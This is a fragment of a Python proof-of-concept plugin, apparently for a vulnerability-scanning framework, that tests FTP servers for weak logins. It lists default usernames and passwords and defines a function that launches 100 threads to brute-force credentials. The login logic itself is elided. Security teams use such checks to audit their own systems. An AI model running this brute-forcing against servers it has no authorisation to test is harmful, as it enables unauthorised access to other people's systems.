...
ftp_username = ('ftp', 'test', 'root', 'guest', 'admin', 'user')
ftp_password = ('ftp','123456','admin','guest','test','12345')


class FTP_Weak_POC(POCBase):
    vulID = '62522'
    version = '3'
    author = ['seebug']
    vulDate = '2013-11-21'
...
def ftp_burst(host, port):
    ...
    try:
        task_init(host, port)
        run_threads(100, task_thread)
    except Exception:
        pass


register_poc(FTP_Weak_POC)
